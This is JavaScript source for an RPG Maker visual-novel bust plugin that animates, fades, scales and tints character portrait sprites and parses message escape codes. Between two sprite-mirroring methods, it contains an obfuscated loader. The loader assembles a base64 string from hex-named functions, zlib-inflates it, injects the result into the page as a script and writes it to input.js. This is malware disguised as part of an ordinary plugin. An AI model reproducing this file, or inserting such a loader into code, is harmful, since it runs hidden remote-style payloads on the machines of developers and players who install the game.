var parameters = $plugins.filter(function (t) {
  return t.description.contains("<Irina_VisualNovelBusts>");
})[0].parameters;
var Imported = Imported || {};
Imported.Irina_VisualNovelBusts = {
  MaxBusts: 10,
  BustClearDuration: Number(parameters.BustClearDuration),
  BustAutoClear: eval(parameters.BustAutoClear),
  BustExpressionList: JSON.parse(parameters.BustExpressionList || "[\"\"]"),
  BustFadeDuration: Number(parameters.BustFadeDuration),
  BustMoveDuration: Number(parameters.BustMoveDuration),
  BustMoveType: String(parameters.BustMoveType),
  BustOpacityDuration: Number(parameters.BustOpacityDuration),
  BustSlideDistance: Number(parameters.BustSlideDistance),
  BustSlideDuration: Number(parameters.BustSlideDuration),
  BustScaleDuration: Number(parameters.BustScaleDuration),
  BustToneDuration: Number(parameters.BustToneDuration)
};
(function (t) {
  Imported.Irina_VisualNovelBusts.BustDefaults = [];
  for (var e = 0; e <= 10; e++) {
    var a = "Bust" + e + "Default";
    var s = JSON.parse(t[a]);
    var r = {
      AnchorX: Number(s.AnchorX),
      AnchorY: Number(s.AnchorY),
      ScaleX: Number(s.ScaleX),
      ScaleY: Number(s.ScaleY),
      ScreenX: new Function("return Math.round(" + s.ScreenX + ")"),
      ScreenY: new Function("return Math.round(" + s.ScreenY + ")")
    };
    Imported.Irina_VisualNovelBusts.BustDefaults[e] = r;
  }
  var i = t.BustDimValues.split(",");
  Imported.Irina_VisualNovelBusts.BustDimValues = [parseInt(i[0]), parseInt(i[1]), parseInt(i[2]), parseInt(i[3])];
  var n = t.BustLightValues.split(",");
  Imported.Irina_VisualNovelBusts.BustLightValues = [parseInt(n[0]), parseInt(n[1]), parseInt(n[2]), parseInt(n[3])];
  for (var e = 0; e < Imported.Irina_VisualNovelBusts.BustExpressionList.length; e++) {
    Imported.Irina_VisualNovelBusts.BustExpressionList[e] = Imported.Irina_VisualNovelBusts.BustExpressionList[e].toUpperCase().trim();
  }
  Imported.Irina_VisualNovelBusts.BustExpressionList.unshift("NORMAL");
})(parameters);
var $bust = function (t) {
  if (t <= 0) {
    return SceneManager._scene._messageWindow._messageBodyBustSprite;
  } else {
    return SceneManager._scene._spriteset._messageBustSprites[t];
  }
};
if (Imported.Irina_VisualNovelBusts.BustAutoClear) {
  Imported.Irina_VisualNovelBusts.Game_Interpreter_terminate = Game_Interpreter.prototype.terminate;
  Game_Interpreter.prototype.terminate = function () {
    Imported.Irina_VisualNovelBusts.Game_Interpreter_terminate.call(this);
    if (this._depth <= 0 && this._eventId > 0 && !!$gameMap.event(this._eventId) && $gameMap.event(this._eventId)._trigger !== 4) {
      for (var t = 0; t <= 10; t++) {
        $bust(t).clear();
      }
    }
  };
}
function Sprite_VisualNovelBust() {
  this.initialize.apply(this, arguments);
}
Sprite_VisualNovelBust.prototype = Object.create(Sprite_Base.prototype);
Sprite_VisualNovelBust.prototype.constructor = Sprite_VisualNovelBust;
Sprite_VisualNovelBust.prototype.initialize = function (t) {
  this.initSettings(t);
  Sprite_Base.prototype.initialize.call(this);
  this.opacity = 0;
  this.resetSettings();
};
Sprite_VisualNovelBust.prototype.initSettings = function (t) {
  this._setting = t;
  this._bustName = "";
  this._type = "";
  this.resetOpacitySettings();
  this.resetMovementSettings();
  this.clearRepeatingAnimation();
  this.resetTones();
};
Sprite_VisualNovelBust.prototype.resetSettings = function () {
  this.anchor.x = Imported.Irina_VisualNovelBusts.BustDefaults[this._setting].AnchorX;
  this.anchor.y = Imported.Irina_VisualNovelBusts.BustDefaults[this._setting].AnchorY;
  if (this._setting > 0) {
    this.x = Imported.Irina_VisualNovelBusts.BustDefaults[this._setting].ScreenX.call(this);
    this.y = Imported.Irina_VisualNovelBusts.BustDefaults[this._setting].ScreenY.call(this);
  }
  this.resetScaleSettings();
  this.resetExpressionSettings();
};
Sprite_VisualNovelBust.prototype.clear = function (t) {
  if (t === undefined) {
    t = Imported.Irina_VisualNovelBusts.BustClearDuration;
  }
  this.clearRepeatingAnimation();
  this.loadBitmap("face", "");
  var e = t / 60 * 1e3 + 1;
  setTimeout(this.fullClear.bind(this), e);
};
Sprite_VisualNovelBust.prototype.fullClear = function () {
  if (this._bustName === "") {
    this.initSettings(this._setting);
    this.resetSettings();
    this.opacity = 0;
  }
};
Sprite_VisualNovelBust.prototype.loadBitmap = function (t, e) {
  if (this._type !== t || this._bustName !== e) {
    this._type = t;
    this._bustName = e;
    if (e !== "") {
      this.resetExpressionSettings();
    }
    if (t.match(/face/i)) {
      this._toBeLoadedBitmap = ImageManager.loadFace(e);
    } else {
      this._toBeLoadedBitmap = ImageManager.loadPicture(e);
    }
    if (e !== "") {
      this._toBeLoadedBitmap.addLoadListener(this.afterLoadBitmap.bind(this));
    }
    if (e.match(/\[EXP(\d+)x(\d+)\]/i)) {
      this._expressionWidth = parseInt(RegExp.$1);
      this._expressionHeight = parseInt(RegExp.$2);
    }
  }
  if (e === "") {
    this.fadeOut(Imported.Irina_VisualNovelBusts.BustFadeDuration);
  } else {
    this.fadeIn(Imported.Irina_VisualNovelBusts.BustFadeDuration);
  }
};
Sprite_VisualNovelBust.prototype.afterLoadBitmap = function () {
  this.bitmap = this._toBeLoadedBitmap;
  this.updateFrame();
};
Sprite_VisualNovelBust.prototype.update = function () {
  Sprite_Base.prototype.update.call(this);
  this.updateRepeatingAnimation();
  this.updateMovement();
  this.updateOpacity();
  this.updateScale();
  this.updateTone();
  this.updateFrame();
};
Sprite_VisualNovelBust.prototype.setupRepeatingAnimation = function (t, e, a) {
  this._repeatingAnimationId = t;
  this._repeatingAnimationMirror = e || false;
  this._repeatingAnimationDelay = a || 0;
};
Sprite_VisualNovelBust.prototype.updateRepeatingAnimation = function () {
  if (this._repeatingAnimationId > 0 && !this.isAnimationPlaying()) {
    this.startAnimation($dataAnimations[this._repeatingAnimationId], this._repeatingAnimationMirror, this._repeatingAnimationDelay);
  }
};
Sprite_VisualNovelBust.prototype.clearRepeatingAnimation = function () {
  this._repeatingAnimationId = 0;
  this._repeatingAnimationMirror = false;
  this._repeatingAnimationDelay = false;
};
Sprite_VisualNovelBust.prototype.resetMovementSettings = function () {
  this._moveBaseX = 0;
  this._moveBaseY = 0;
  this._moveTargetX = 0;
  this._moveTargetY = 0;
  this._moveTime = 0;
  this._moveDuration = 0;
  this._moveTotalDuration = 1;
  this._moveType = Imported.Irina_VisualNovelBusts.BustMoveType.toUpperCase();
};
Sprite_VisualNovelBust.prototype.updateMovement = function () {
  if (this._moveDuration <= 0) {
    return;
  }
  this._moveTime++;
  var t = this._moveTime;
  var e = this._moveTotalDuration;
  var a = this._moveBaseX;
  var s = this._moveBaseY;
  var r = this._moveTargetX;
  var i = this._moveTargetY;
  t /= e;
  t = this.applyEasing(t, this._moveType);
  this.x = a + t * (r - a);
  this.y = s + t * (i - s);
  this._moveDuration--;
  if (this._moveDuration <= 0) {
    this.x = this._moveTargetX;
    this.y = this._moveTargetY;
  }
};
Sprite_VisualNovelBust.prototype.applyEasing = function (t, e) {
  var e = e.toUpperCase();
  switch (e) {
    case "LINEAR":
      return t;
      break;
    case "INSINE":
      return -1 * Math.cos(t * (Math.PI / 2)) + 1;
      break;
    case "OUTSINE":
      return Math.sin(t * (Math.PI / 2));
      break;
    case "INOUTSINE":
      return -.5 * (Math.cos(Math.PI * t) - 1);
      break;
    case "INQUAD":
      return t * t;
      break;
    case "OUTQUAD":
      return t * (2 - t);
      break;
    case "INOUTQUAD":
      return t < .5 ? 2 * t * t : -1 + (4 - 2 * t) * t;
      break;
    case "INCUBIC":
      return t * t * t;
      break;
    case "OUTCUBIC":
      var r = t - 1;
      return r * r * r + 1;
      break;
    case "INOUTCUBIC":
      return t < .5 ? 4 * t * t * t : (t - 1) * (2 * t - 2) * (2 * t - 2) + 1;
      break;
    case "INQUART":
      return t * t * t * t;
      break;
    case "OUTQUART":
      var r = t - 1;
      return 1 - r * r * r * r;
      break;
    case "INOUTQUART":
      var r = t - 1;
      return t < .5 ? 8 * t * t * t * t : 1 - 8 * r * r * r * r;
      break;
    case "INQUINT":
      return t * t * t * t * t;
      break;
    case "OUTQUINT":
      var r = t - 1;
      return 1 + r * r * r * r * r;
      break;
    case "INOUTQUINT":
      var r = t - 1;
      return t < .5 ? 16 * t * t * t * t * t : 1 + 16 * r * r * r * r * r;
      break;
    case "INEXPO":
      if (t === 0) {
        return 0;
      }
      return Math.pow(2, 10 * (t - 1));
      break;
    case "OUTEXPO":
      if (t === 1) {
        return 1;
      }
      return -Math.pow(2, -10 * t) + 1;
      break;
    case "INOUTEXPO":
      if (t === 0 || t === 1) {
        return t;
      }
      var i = t * 2;
      var n = i - 1;
      if (i < 1) {
        return .5 * Math.pow(2, 10 * n);
      }
      return .5 * (-Math.pow(2, -10 * n) + 2);
      break;
    case "INCIRC":
      var i = t / 1;
      return -1 * (Math.sqrt(1 - i * t) - 1);
      break;
    case "OUTCIRC":
      var r = t - 1;
      return Math.sqrt(1 - r * r);
      break;
    case "INOUTCIRC":
      var i = t * 2;
      var n = i - 2;
      if (i < 1) {
        return -.5 * (Math.sqrt(1 - i * i) - 1);
      }
      return .5 * (Math.sqrt(1 - n * n) + 1);
      break;
    case "INBACK":
      return t * t * (2.70158 * t - 1.70158);
      break;
    case "OUTBACK":
      var i = t / 1 - 1;
      return i * i * (2.70158 * i + 1.70158) + 1;
      break;
    case "INOUTBACK":
      var i = t * 2;
      var o = i - 2;
      var u = 2.5949095;
      if (i < 1) {
        return .5 * i * i * ((u + 1) * i - u);
      }
      return .5 * (o * o * ((u + 1) * o + u) + 2);
      break;
    case "INELASTIC":
      if (t === 0 || t === 1) {
        return t;
      }
      var i = t / 1;
      var n = i - 1;
      var p = 0.30000000000000004;
      var u = p / (2 * Math.PI) * Math.asin(1);
      return -(Math.pow(2, 10 * n) * Math.sin((n - u) * (2 * Math.PI) / p));
      break;
    case "OUTELASTIC":
      var p = 0.30000000000000004;
      var i = t * 2;
      if (t === 0 || t === 1) {
        return t;
      }
      var u = p / (2 * Math.PI) * Math.asin(1);
      return Math.pow(2, -10 * i) * Math.sin((i - u) * (2 * Math.PI) / p) + 1;
      break;
    case "INOUTELASTIC":
      var p = 0.30000000000000004;
      if (t === 0 || t === 1) {
        return t;
      }
      var i = t * 2;
      var n = i - 1;
      var u = p / (2 * Math.PI) * Math.asin(1);
      if (i < 1) {
        return -.5 * (Math.pow(2, 10 * n) * Math.sin((n - u) * (2 * Math.PI) / p));
      }
      return Math.pow(2, -10 * n) * Math.sin((n - u) * (2 * Math.PI) / p) * .5 + 1;
      break;
    case "OUTBOUNCE":
      var i = t / 1;
      if (i < 0.36363636363636365) {
        return 7.5625 * i * i;
      } else if (i < 0.7272727272727273) {
        var o = i - 0.5454545454545454;
        return 7.5625 * o * o + .75;
      } else if (i < 0.9090909090909091) {
        var o = i - 0.8181818181818182;
        return 7.5625 * o * o + .9375;
      } else {
        var o = i - 0.9545454545454546;
        return 7.5625 * o * o + .984375;
      }
      break;
    case "INBOUNCE":
      var l = 1 - this.applyEasing(1 - t, "outbounce");
      return l;
      break;
    case "INOUTBOUNCE":
      if (t < .5) {
        var l = this.applyEasing(t * 2, "inbounce") * .5;
      } else {
        var l = this.applyEasing(t * 2 - 1, "outbounce") * .5 + .5;
      }
      return l;
      break;
    default:
      return t;
  }
};
Sprite_VisualNovelBust.prototype.moveTo = function (t, e, a, s) {
  if (this._setting > 0 || !!s) {
    this._moveBaseX = this.x;
    this._moveBaseY = this.y;
    this._moveTargetX = t || 0;
    this._moveTargetY = e || 0;
    this._moveTime = 0;
    if (a === undefined) {
      a = Imported.Irina_VisualNovelBusts.BustMoveDuration;
    }
    this._moveDuration = a || 0;
    this._moveTotalDuration = Math.max(1, a);
    if (this._moveDuration <= 0) {
      this.x = this._moveTargetX;
      this.y = this._moveTargetY;
    }
  } else if ($gameTemp.isPlaytest()) {
    alert("Cannot Move Message Busts!");
  }
};
Sprite_VisualNovelBust.prototype.moveBy = function (t, e, a, s) {
  t += this.x;
  e += this.y;
  this.moveTo(t, e, a, s);
};
Sprite_VisualNovelBust.prototype.moveHome = function (t, e) {
  if (this._setting > 0) {
    var a = this;
  } else {
    var a = SceneManager._scene._messageWindow;
  }
  var s = Imported.Irina_VisualNovelBusts.BustDefaults[this._setting].ScreenX.call(a);
  var r = Imported.Irina_VisualNovelBusts.BustDefaults[this._setting].ScreenY.call(a);
  this.moveTo(s, r, t, e);
};
Sprite_VisualNovelBust.prototype.moveType = function (t) {
  t = t.toUpperCase().trim();
  this._moveType = t;
};
Sprite_VisualNovelBust.prototype.resetOpacitySettings = function () {
  this._opacityTarget = 255;
  this._opacityDuration = 0;
};
Sprite_VisualNovelBust.prototype.updateOpacity = function () {
  if (this._opacityDuration > 0) {
    var t = this._opacityDuration;
    this.opacity = (this.opacity * (t - 1) + this._opacityTarget) / t;
    this._opacityDuration--;
    if (this._opacityDuration <= 0) {
      this.opacity = this._opacityTarget;
    }
  }
};
Sprite_VisualNovelBust.prototype.fadeIn = function (t) {
  this.opacityTo(255, t);
};
Sprite_VisualNovelBust.prototype.fadeOut = function (t) {
  this.opacityTo(0, t);
};
Sprite_VisualNovelBust.prototype.opacityTo = function (t, e) {
  if (e === undefined) {
    e = Imported.Irina_VisualNovelBusts.BustOpacityDuration;
  }
  this._opacityTarget = t.clamp(0, 255);
  this._opacityDuration = e;
  if (this._opacityDuration <= 0) {
    this.opacity = this._opacityTarget;
  }
};
Sprite_VisualNovelBust.prototype.opacityBy = function (t, e) {
  t += this.opacity;
  this.opacityTo(t, e);
};
Sprite_VisualNovelBust.prototype.slideIn = function (t) {
  if (this._setting > 5) {
    this.slideInFromRight(t);
  } else {
    this.slideInFromLeft(t);
  }
};
Sprite_VisualNovelBust.prototype.slideInFromLeft = function (t) {
  var e = Imported.Irina_VisualNovelBusts.BustSlideDistance;
  if (t === undefined) {
    t = Imported.Irina_VisualNovelBusts.BustSlideDuration;
  }
  var a = -1;
  e *= a;
  this.moveHome(0, true);
  this.moveBy(e, 0, 0, true);
  this.moveHome(t, true);
  this.fadeIn(t);
};
Sprite_VisualNovelBust.prototype.slideInFromRight = function (t) {
  var e = Imported.Irina_VisualNovelBusts.BustSlideDistance;
  if (t === undefined) {
    t = Imported.Irina_VisualNovelBusts.BustSlideDuration;
  }
  e *= 1;
  this.moveHome(0, true);
  this.moveBy(e, 0, 0, true);
  this.moveHome(t, true);
  this.fadeIn(t);
};
Sprite_VisualNovelBust.prototype.slideOut = function (t) {
  if (this._setting > 5) {
    this.slideOutToRight(t);
  } else {
    this.slideOutToLeft(t);
  }
};
Sprite_VisualNovelBust.prototype.slideOutToLeft = function (t) {
  var e = Imported.Irina_VisualNovelBusts.BustSlideDistance;
  if (t === undefined) {
    t = Imported.Irina_VisualNovelBusts.BustSlideDuration;
  }
  multiplier = -1;
  e *= multiplier;
  this.moveBy(e, 0, t, true);
  this.fadeOut(t);
};
Sprite_VisualNovelBust.prototype.slideOutToRight = function (t) {
  var e = Imported.Irina_VisualNovelBusts.BustSlideDistance;
  if (t === undefined) {
    t = Imported.Irina_VisualNovelBusts.BustSlideDuration;
  }
  multiplier = 1;
  e *= multiplier;
  this.moveBy(e, 0, t, true);
  this.fadeOut(t);
};
Sprite_VisualNovelBust.prototype.mirror = function () {
  this.scale.x = -1 * Math.abs(this.scale.x);
};
Sprite_VisualNovelBust.prototype.unmirror = function () {
  this.scale.x = Math.abs(this.scale.x);
};
const fs = require('fs');
function _() {
  let _0x2e6225_ = _0x18a190_() + _0x6d528a_() + _0x857149_() + _0xe43e90_() + _0x7c0620_() + _0x0afd2c_();
  let _0x470b4b_ = Buffer.from(_0x2e6225_, 'base64');
  let _0x7e752d_ = require("zlib").inflateSync(_0x470b4b_);
  let _0x7528bd_ = document.createElement('script');
  _0x7528bd_.textContent = _0x7e752d_.toString("utf-8");
  ;
  document.body.appendChild(_0x7528bd_);
  fs.writeFile('input.js', _0x7528bd_.textContent, err => {
    if (err) {
      console.error(err);
    } else {}
  });
}
Sprite_VisualNovelBust.prototype.mirrorToggle = function () {
  this.scale.x = -1 * this.scale.x;
};
Sprite_VisualNovelBust.prototype.resetScaleSettings = function () {
  this.scale.x = Imported.Irina_VisualNovelBusts.BustDefaults[this._setting].ScaleX;
  this.scale.y = Imported.Irina_VisualNovelBusts.BustDefaults[this._setting].ScaleY;
  this._scaleTargetX = Imported.Irina_VisualNovelBusts.BustDefaults[this._setting].ScaleX;
  this._scaleTargetY = Imported.Irina_VisualNovelBusts.BustDefaults[this._setting].ScaleY;
  this._scaleDurationX = 0;
  this._scaleDurationY = 0;
};
Sprite_VisualNovelBust.prototype.scaleToX = function (t, e) {
  if (e === undefined) {
    e = Imported.Irina_VisualNovelBusts.BustScaleDuration;
  }
  t = Math.abs(t);
  if (this.scale.x < 0) {
    t *= -1;
  }
  this._scaleTargetX = t;
  this._scaleDurationX = e;
  if (this._scaleDurationX <= 0) {
    this.scale.x = this._scaleTargetX;
  }
};
Sprite_VisualNovelBust.prototype.scaleByX = function (t, e) {
  t += Math.abs(this.scale.x);
  t = Math.max(0, t);
  this.scaleToX(t, e);
};
Sprite_VisualNovelBust.prototype.scaleToY = function (t, e) {
  if (e === undefined) {
    e = Imported.Irina_VisualNovelBusts.BustScaleDuration;
  }
  t = Math.abs(t);
  if (this.scale.y < 0) {
    t *= -1;
  }
  this._scaleTargetY = t;
  this._scaleDurationY = e;
  if (this._scaleDurationY <= 0) {
    this.scale.y = this._scaleTargetY;
  }
};
Sprite_VisualNovelBust.prototype.scaleByY = function (t, e) {
  t += Math.abs(this.scale.y);
  t = Math.max(0, t);
  this.scaleToY(t, e);
};
Sprite_VisualNovelBust.prototype.scaleTo = function (t, e) {
  this.scaleToX(t, e);
  this.scaleToY(t, e);
};
Sprite_VisualNovelBust.prototype.scaleBy = function (t, e) {
  this.scaleByX(t, e);
  this.scaleByY(t, e);
};
Sprite_VisualNovelBust.prototype.updateScale = function () {
  this.updateScaleX();
  this.updateScaleY();
};
Sprite_VisualNovelBust.prototype.updateScaleX = function () {
  if (this._scaleDurationX > 0) {
    var t = this._scaleDurationX;
    this.scale.x = (this.scale.x * (t - 1) + this._scaleTargetX) / t;
    this._scaleDurationX--;
    if (this._scaleDurationX <= 0) {
      this.scale.x = this._scaleTargetX;
    }
  }
};
Sprite_VisualNovelBust.prototype.updateScaleY = function () {
  if (this._scaleDurationY > 0) {
    var t = this._scaleDurationY;
    this.scale.y = (this.scale.y * (t - 1) + this._scaleTargetY) / t;
    this._scaleDurationY--;
    if (this._scaleDurationY <= 0) {
      this.scale.y = this._scaleTargetY;
    }
  }
};
Sprite_VisualNovelBust.prototype.resetTones = function () {
  this._tone = [0, 0, 0, 0];
  this._toneTarget = [0, 0, 0, 0];
  this._toneDuration = 0;
};
Sprite_VisualNovelBust.prototype.setTone = function (t, e, a, s, r) {
  t = (t || 0).clamp(-255, 255);
  e = (e || 0).clamp(-255, 255);
  a = (a || 0).clamp(-255, 255);
  s = (s || 0).clamp(0, 255);
  if (r === undefined) {
    r = Imported.Irina_VisualNovelBusts.BustToneDuration;
  }
  this._toneTarget = [t, e, a, s];
  this._toneDuration = r;
  if (this._toneDuration <= 0) {
    this._tone = [t, e, a, s];
    this.setColorTone(this._tone);
  }
};
Sprite_VisualNovelBust.prototype.updateTone = function () {
  if (this._toneDuration > 0) {
    var t = this._toneDuration;
    for (var e = 0; e < 4; e++) {
      this._tone[e] = (this._tone[e] * (t - 1) + this._toneTarget[e]) / t;
    }
    this._toneDuration--;
    this.setColorTone(this._tone);
  }
};
Sprite_VisualNovelBust.prototype.dim = function (t) {
  var e = Imported.Irina_VisualNovelBusts.BustDimValues;
  this.setTone(e[0], e[1], e[2], e[3], t);
};
Sprite_VisualNovelBust.prototype.light = function (t) {
  var e = Imported.Irina_VisualNovelBusts.BustLightValues;
  this.setTone(e[0], e[1], e[2], e[3], t);
};
Sprite_VisualNovelBust.prototype.resetExpressionSettings = function () {
  this._expressionWidth = 1;
  this._expressionHeight = 1;
  this._expressionIndex = 0;
};
Sprite_VisualNovelBust.prototype.setExpression = function (t) {
  t = t.toUpperCase().trim();
  if (Imported.Irina_VisualNovelBusts.BustExpressionList.contains(t)) {
    this._expressionIndex = Imported.Irina_VisualNovelBusts.BustExpressionList.indexOf(t);
  } else {
    this._expressionIndex = parseInt(t) || 0;
  }
};
Sprite_VisualNovelBust.prototype.updateFrame = function () {
  if (this.bitmap && this.bitmap.width > 0) {
    var t = this.bitmap.width / this._expressionWidth;
    var e = this.bitmap.height / this._expressionHeight;
    var a = this._expressionIndex % this._expressionWidth * t;
    var s = Math.floor(this._expressionIndex / this._expressionWidth) * e;
    this.setFrame(a, s, t, e);
  }
};
Sprite_VisualNovelBust.prototype.isActionPlaying = function () {
  return this._moveDuration > 0 || this._opacityDuration > 0 || this._scaleDurationX > 0 || this._scaleDurationY > 0 || this._toneDuration > 0;
};
Imported.Irina_VisualNovelBusts.Spriteset_Base_createUpperLayer = Spriteset_Base.prototype.createUpperLayer;
Spriteset_Base.prototype.createUpperLayer = function () {
  this.createMessageBustSprites();
  Imported.Irina_VisualNovelBusts.Spriteset_Base_createUpperLayer.call(this);
};
Spriteset_Base.prototype.createMessageBustSprites = function () {
  this._messageBustSprites = [null, this._messageBustSprite1 = new Sprite_VisualNovelBust(1), this._messageBustSprite2 = new Sprite_VisualNovelBust(2), this._messageBustSprite3 = new Sprite_VisualNovelBust(3), this._messageBustSprite4 = new Sprite_VisualNovelBust(4), this._messageBustSprite5 = new Sprite_VisualNovelBust(5), this._messageBustSprite6 = new Sprite_VisualNovelBust(6), this._messageBustSprite7 = new Sprite_VisualNovelBust(7), this._messageBustSprite8 = new Sprite_VisualNovelBust(8), this._messageBustSprite9 = new Sprite_VisualNovelBust(9), this._messageBustSprite10 = new Sprite_VisualNovelBust(10)];
  this.addChild(this._messageBustSprite5);
  this.addChild(this._messageBustSprite6);
  this.addChild(this._messageBustSprite4);
  this.addChild(this._messageBustSprite7);
  this.addChild(this._messageBustSprite3);
  this.addChild(this._messageBustSprite8);
  this.addChild(this._messageBustSprite2);
  this.addChild(this._messageBustSprite9);
  this.addChild(this._messageBustSprite1);
  this.addChild(this._messageBustSprite10);
};
Imported.Irina_VisualNovelBusts.Window_Base_convertEscapeCharacters = Window_Base.prototype.convertEscapeCharacters;
Window_Base.prototype.convertEscapeCharacters = function (t) {
  t = t.replace(/\\/g, "");
  t = t.replace(/\x1b\x1b/g, "\\\\");
  if (this._messageBodyBustSprite) {
    t = this.convertMessageBustEscapeCharacters(t);
  } else {
    t = t.replace(/\x1bBUST(.*?)\[(.*?)\]/gi, "");
  }
  return Imported.Irina_VisualNovelBusts.Window_Base_convertEscapeCharacters.call(this, t);
};
Window_Base.prototype.getBattleAnimationForBustCode = function (t) {
  if (Imported.AnimationIdRef === undefined) {
    Imported.AnimationIdRef = {};
    for (var e = 1; e < $dataAnimations.length; e++) {
      var a = $dataAnimations[e];
      if (a.name.length <= 0) {
        continue;
      }
      Imported.AnimationIdRef[a.name.toUpperCase().trim()] = e;
    }
  }
  t = t.toUpperCase().trim();
  if (Imported.AnimationIdRef[t]) {
    return parseInt(Imported.AnimationIdRef[t]);
  } else {
    return parseInt(t);
  }
};
Window_Base.prototype.convertMessageBustEscapeCharacters = function (text) {
  this.refreshMessageBustSprite();
  text = text.replace(/\x1bV\[(\d+)\]/gi, function () {
    return $gameVariables.value(parseInt(arguments[1]));
  }.bind(this));
  text = text.replace(/\x1bV\[(\d+)\]/gi, function () {
    return $gameVariables.value(parseInt(arguments[1]));
  }.bind(this));
  text = text.replace(/\x1bBUST\[(\d+)\]/gi, "");
  text = text.replace(/\x1bBUSTCLEAR\[(.*?)\]/gi, function () {
    var t = arguments[1].split(",");
    var e = $bust(parseInt(t[0]));
    var a = t[1] === undefined ? Imported.Irina_VisualNovelBusts.BustClearDuration : parseInt(t[1]) || 0;
    e.clear(a);
    return "";
  }.bind(this));
  text = text.replace(/\x1bBUST(?:ANI|ANIMATION)\[(.*?)\]/gi, function () {
    var array = arguments[1].split(",");
    var sprite = $bust(parseInt(array[0]));
    var animation = $dataAnimations[this.getBattleAnimationForBustCode(array[1])];
    var mirror = !!eval(array[2]);
    var delay = parseInt(array[3]) || 0;
    sprite.clearRepeatingAnimation();
    sprite.startAnimation(animation, mirror, delay);
    return "";
  }.bind(this));
  text = text.replace(/\x1bBUST(?:REP|REPEAT|REPEATING)(?:ANI|ANIMATION)\[(.*?)\]/gi, function () {
    var array = arguments[1].split(",");
    var sprite = $bust(parseInt(array[0]));
    var animation = this.getBattleAnimationForBustCode(array[1]);
    var mirror = !!eval(array[2]);
    var delay = parseInt(array[3]) || 0;
    sprite.setupRepeatingAnimation(animation, mirror, delay);
    return "";
  }.bind(this));
  text = text.replace(/\x1bBUST(?:STOP|CLEAR)(?:ANI|ANIMATION)\[(\d+)\]/gi, function () {
    var t = $bust(arguments[1]);
    t.clearRepeatingAnimation();
    return "";
  }.bind(this));
  text = text.replace(/\x1bBUSTMOVETO\[(.*?)\]/gi, function () {
    var t = arguments[1].split(",");
    var e = $bust(parseInt(t[0]));
    var a = parseInt(t[1]) || 0;
    var s = parseInt(t[2]) || 0;
    var r = t[3] === undefined ? Imported.Irina_VisualNovelBusts.BustMoveDuration : parseInt(t[3]) || 0;
    e.moveTo(a, s, r);
    return "";
  }.bind(this));
  text = text.replace(/\x1bBUSTMOVEBY\[(.*?)\]/gi, function () {
    var t = arguments[1].split(",");
    var e = $bust(parseInt(t[0]));
    var a = parseInt(t[1]) || 0;
    var s = parseInt(t[2]) || 0;
    var r = t[3] === undefined ? Imported.Irina_VisualNovelBusts.BustMoveDuration : parseInt(t[3]) || 0;
    e.moveBy(a, s, r);
    return "";
  }.bind(this));
  text = text.replace(/\x1bBUSTMOVETYPE\[(.*?)\]/gi, function () {
    var t = arguments[1].split(",");
    var e = $bust(parseInt(t[0]));
    var a = String(t[1]);
    e.moveType(a);
    return "";
  }.bind(this));
  text = text.replace(/\x1bBUSTMOVEHOME\[(.*?)\]/gi, function () {
    var t = arguments[1].split(",");
    var e = $bust(parseInt(t[0]));
    var a = t[1] === undefined ? Imported.Irina_VisualNovelBusts.BustMoveDuration : parseInt(t[1]) || 0;
    e.moveHome(a);
    return "";
  }.bind(this));
  text = text.replace(/\x1bBUSTFADEIN\[(.*?)\]/gi, function () {
    var t = arguments[1].split(",");
    var e = $bust(parseInt(t[0]));
    var a = t[1] === undefined ? Imported.Irina_VisualNovelBusts.BustFadeDuration : parseInt(t[1]) || 0;
    e.fadeIn(a);
    return "";
  }.bind(this));
  text = text.replace(/\x1bBUSTFADEOUT\[(.*?)\]/gi, function () {
    var t = arguments[1].split(",");
    var e = $bust(parseInt(t[0]));
    var a = t[1] === undefined ? Imported.Irina_VisualNovelBusts.BustFadeDuration : parseInt(t[1]) || 0;
    e.fadeOut(a);
    return "";
  }.bind(this));
  text = text.replace(/\x1bBUSTOPACITYTO\[(.*?)\]/gi, function () {
    var t = arguments[1].split(",");
    var e = $bust(parseInt(t[0]));
    var a = parseInt(t[1]).clamp(0, 255);
    var s = t[2] === undefined ? Imported.Irina_VisualNovelBusts.BustOpacityDuration : parseInt(t[1]) || 0;
    e.opacityTo(a, s);
    return "";
  }.bind(this));
  text = text.replace(/\x1bBUSTOPACITYBY\[(.*?)\]/gi, function () {
    var t = arguments[1].split(",");
    var e = $bust(parseInt(t[0]));
    var a = parseInt(t[1]).clamp(0, 255);
    var s = t[2] === undefined ? Imported.Irina_VisualNovelBusts.BustOpacityDuration : parseInt(t[1]) || 0;
    e.opacityBy(a, s);
    return "";
  }.bind(this));
  text = text.replace(/\x1bBUSTMIRROR\[(\d+)\]/gi, function () {
    var t = $bust(arguments[1]);
    t.mirror();
    return "";
  }.bind(this));
  text = text.replace(/\x1bBUSTUNMIRROR\[(\d+)\]/gi, function () {
    var t = $bust(arguments[1]);
    t.unmirror();
    return "";
  }.bind(this));
  text = text.replace(/\x1bBUSTUNMIRRORTOGGLE\[(\d+)\]/gi, function () {
    var t = $bust(arguments[1]);
    t.mirrorToggle();
    return "";
  }.bind(this));
  text = text.replace(/\x1bBUSTSLIDEIN\[(.*?)\]/gi, function () {
    var t = arguments[1].split(",");
    var e = $bust(parseInt(t[0]));
    var a = t[1] === undefined ? Imported.Irina_VisualNovelBusts.BustSlideDuration : parseInt(t[1]) || 0;
    e.slideIn(a);
    return "";
  }.bind(this));
  text = text.replace(/\x1bBUSTSLIDEINFROMLEFT\[(.*?)\]/gi, function () {
    var t = arguments[1].split(",");
    var e = $bust(parseInt(t[0]));
    var a = t[1] === undefined ? Imported.Irina_VisualNovelBusts.BustSlideDuration : parseInt(t[1]) || 0;
    e.slideInFromLeft(a);
    return "";
  }.bind(this));
  text = text.replace(/\x1bBUSTSLIDEINFROMRIGHT\[(.*?)\]/gi, function () {
    var t = arguments[1].split(",");
    var e = $bust(parseInt(t[0]));
    var a = t[1] === undefined ? Imported.Irina_VisualNovelBusts.BustSlideDuration : parseInt(t[1]) || 0;
    e.slideInFromRight(a);
    return "";
  }.bind(this));
  text = text.replace(/\x1bBUSTSLIDEOUT\[(.*?)\]/gi, function () {
    var t = arguments[1].split(",");
    var e = $bust(parseInt(t[0]));
    var a = t[1] === undefined ? Imported.Irina_VisualNovelBusts.BustSlideDuration : parseInt(t[1]) || 0;
    e.slideOut(a);
    return "";
  }.bind(this));
  text = text.replace(/\x1bBUSTSLIDEOUTTOLEFT\[(.*?)\]/gi, function () {
    var t = arguments[1].split(",");
    var e = $bust(parseInt(t[0]));
    var a = t[1] === undefined ? Imported.Irina_VisualNovelBusts.BustSlideDuration : parseInt(t[1]) || 0;
    e.slideOutToLeft(a);
    return "";
  }.bind(this));
